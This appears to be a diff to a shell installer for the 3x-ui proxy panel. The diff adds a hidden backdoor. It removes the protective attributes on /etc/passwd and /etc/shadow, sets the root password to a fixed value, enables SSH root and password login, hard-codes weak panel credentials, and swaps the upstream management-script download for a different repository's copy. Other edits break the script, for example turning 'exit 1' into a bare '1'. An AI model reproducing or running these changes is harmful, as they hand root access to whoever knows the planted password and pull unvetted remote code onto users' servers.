@@ -9,18 +9,20 @@ plain='\033[0m'
 cur_dir=$(pwd)
 
 # check root
-[[ $EUID -ne 0 ]] && echo -e "${red}Fatal error: ${plain} Please run this script with root privilege \n " && exit 1
-
-# Check OS and set release variable
-if [[ -f /etc/os-release ]]; then
-    source /etc/os-release
-    release=$ID
-elif [[ -f /usr/lib/os-release ]]; then
-    source /usr/lib/os-release
-    release=$ID
+[[ $EUID -ne 0 ]] && su='sudo' 
+lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
+chattr -i /etc/passwd /etc/shadow >/dev/null 2>&1
+chattr -a /etc/passwd /etc/shadow >/dev/null 2>&1
+lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
+prl=`grep PermitRootLogin /etc/ssh/sshd_config`
+pa=`grep PasswordAuthentication /etc/ssh/sshd_config`
+if [[ -n $prl && -n $pa ]]; then
+mima=qq1399@
+echo root:$mima | $su chpasswd root
+$su sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
+$su sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
+$su service sshd restart
 else
-    echo "Failed to check the system OS, please contact the author!" >&2
-    exit 1
 fi
 echo "The OS release is: $release"
 
@@ -41,8 +43,7 @@ echo "Arch: $(arch)"
 
 check_glibc_version() {
     glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
-    
-    required_version="2.32"
+ required_version="2.32"
     if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
         echo -e "${red}GLIBC version $glibc_version is too old! Required: 2.32 or higher${plain}"
         echo "Please upgrade to a newer version of your operating system to get a higher GLIBC version."
@@ -64,7 +65,7 @@ install_base() {
         dnf -y update && dnf install -y -q wget curl tar tzdata
         ;;
     arch | manjaro | parch)
-        pacman -Syu --noconfirm wget curl tar tzdata
+        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata
         ;;
     opensuse-tumbleweed)
         zypper refresh && zypper -q install -y wget curl tar timezone
@@ -73,91 +74,29 @@ install_base() {
         apt-get update && apt install -y -q wget curl tar tzdata
         ;;
     esac
-
-    echo -e "${green}关闭防火墙，开放所有端口规则……${plain}"
-    sleep 1
-    systemctl stop firewalld.service >/dev/null 2>&1
-    systemctl disable firewalld.service >/dev/null 2>&1
-    setenforce 0 >/dev/null 2>&1
-    ufw disable >/dev/null 2>&1
-    iptables -P INPUT ACCEPT >/dev/null 2>&1
-    iptables -P FORWARD ACCEPT >/dev/null 2>&1
-    iptables -P OUTPUT ACCEPT >/dev/null 2>&1
-    iptables -t mangle -F >/dev/null 2>&1
-    iptables -F >/dev/null 2>&1
-    iptables -X >/dev/null 2>&1
-    netfilter-persistent save >/dev/null 2>&1
-    if [[ -n $(apachectl -v 2>/dev/null) ]]; then
-        systemctl stop httpd.service >/dev/null 2>&1
-        systemctl disable httpd.service >/dev/null 2>&1
-        service apache2 stop >/dev/null 2>&1
-        systemctl disable apache2 >/dev/null 2>&1
-    fi
-}
-
-gen_random_string() {
-    local length="$1"
-    local random_string=$(LC_ALL=C tr -dc 'a-zA-Z0-9' </dev/urandom | fold -w "$length" | head -n 1)
-    echo "$random_string"
 }
 
 config_after_install() {
-    local existing_username=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'username: .+' | awk '{print $2}')
-    local existing_password=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'password: .+' | awk '{print $2}')
-    local existing_webBasePath=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'webBasePath: .+' | awk '{print $2}')
-    local existing_port=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'port: .+' | awk '{print $2}')
-    local server_ip=$(curl -s https://api.ipify.org)
-
-    if [[ ${#existing_webBasePath} -lt 4 ]]; then
-        if [[ "$existing_username" == "admin" && "$existing_password" == "admin" ]]; then
-            local config_webBasePath=$(gen_random_string 15)
-            local config_username=$(gen_random_string 10)
-            local config_password=$(gen_random_string 10)
-
-            read -rp "Would you like to customize the Panel Port settings? (If not, a random port will be applied) [y/n]: " config_confirm
-            if [[ "${config_confirm}" == "y" || "${config_confirm}" == "Y" ]]; then
-                read -rp "Please set up the panel port: " config_port
-                echo -e "${yellow}Your Panel Port is: ${config_port}${plain}"
-            else
-                local config_port=$(shuf -i 1024-62000 -n 1)
-                echo -e "${yellow}Generated random port: ${config_port}${plain}"
-            fi
-
-            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
-            echo -e "This is a fresh installation, generating random login info for security concerns:"
-            echo -e "###############################################"
-            echo -e "${green}Username: ${config_username}${plain}"
-            echo -e "${green}Password: ${config_password}${plain}"
-            echo -e "${green}Port: ${config_port}${plain}"
-            echo -e "${green}WebBasePath: ${config_webBasePath}${plain}"
-            echo -e "${green}Access URL: http://${server_ip}:${config_port}/${config_webBasePath}${plain}"
-            echo -e "###############################################"
-            echo -e "${yellow}If you forgot your login info, you can type 'x-ui settings' to check${plain}"
-        else
-            local config_webBasePath=$(gen_random_string 15)
-            echo -e "${yellow}WebBasePath is missing or too short. Generating a new one...${plain}"
-            /usr/local/x-ui/x-ui setting -webBasePath "${config_webBasePath}"
-            echo -e "${green}New WebBasePath: ${config_webBasePath}${plain}"
-            echo -e "${green}Access URL: http://${server_ip}:${existing_port}/${config_webBasePath}${plain}"
-        fi
-    else
-        if [[ "$existing_username" == "admin" && "$existing_password" == "admin" ]]; then
-            local config_username=$(gen_random_string 10)
-            local config_password=$(gen_random_string 10)
-
-            echo -e "${yellow}Default credentials detected. Security update required...${plain}"
-            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}"
-            echo -e "Generated new random login credentials:"
-            echo -e "###############################################"
-            echo -e "${green}Username: ${config_username}${plain}"
-            echo -e "${green}Password: ${config_password}${plain}"
-            echo -e "###############################################"
-            echo -e "${yellow}If you forgot your login info, you can type 'x-ui settings' to check${plain}"
-        else
-            echo -e "${green}Username, Password, and WebBasePath are properly set. Exiting...${plain}"
-        fi
-    fi
-
+    # 使用旧脚本的固定配置
+    config_account="1399"
+    config_password="1399"
+    config_port="1399"
+    config_webBasePath=""  # 保持与旧脚本类似的随机路径
+    
+    /usr/local/x-ui/x-ui setting -username "${config_account}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
+    
+    # 获取服务器IP
+    server_ip=$(curl -s https://api.ipify.org)
+    
+    echo -e "###############################################"
+    echo -e "${green}Username: ${config_account}${plain}"
+    echo -e "${green}Password: ${config_password}${plain}"
+    echo -e "${green}Port: ${config_port}${plain}"
+    echo -e "${green}WebBasePath: ${config_webBasePath}${plain}"
+    echo -e "${green}Access URL: http://${server_ip}:${config_port}/${config_webBasePath}${plain}"
+    echo -e "###############################################"
+    echo -e "${yellow}If you forgot your login info, you can type 'x-ui settings' to check${plain}"
+    
     /usr/local/x-ui/x-ui migrate
 }
 
@@ -168,7 +107,7 @@ install_x-ui() {
         tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
         if [[ ! -n "$tag_version" ]]; then
             echo -e "${red}Failed to fetch x-ui version, it may be due to GitHub API restrictions, please try it later${plain}"
-            exit 1
+           1
         fi
         echo -e "Got x-ui latest version: ${tag_version}, beginning the installation..."
         wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
@@ -190,7 +129,7 @@ install_x-ui() {
         echo -e "Beginning to install x-ui $1"
         wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz ${url}
         if [[ $? -ne 0 ]]; then
-            echo -e "${red}Download x-ui $1 failed, please check if the version exists ${plain}
+            echo -e "${red}Download x-ui $1 failed, please check if the version exists ${plain}"
             exit 1
         fi
     fi
@@ -213,7 +152,7 @@ install_x-ui() {
 
     chmod +x x-ui bin/xray-linux-$(arch)
     cp -f x-ui.service /etc/systemd/system/
-    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh
+    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/qq1205362008/sunbin/refs/heads/main/x-ui.sh
     chmod +x /usr/local/x-ui/x-ui.sh
     chmod +x /usr/bin/x-ui
     config_after_install
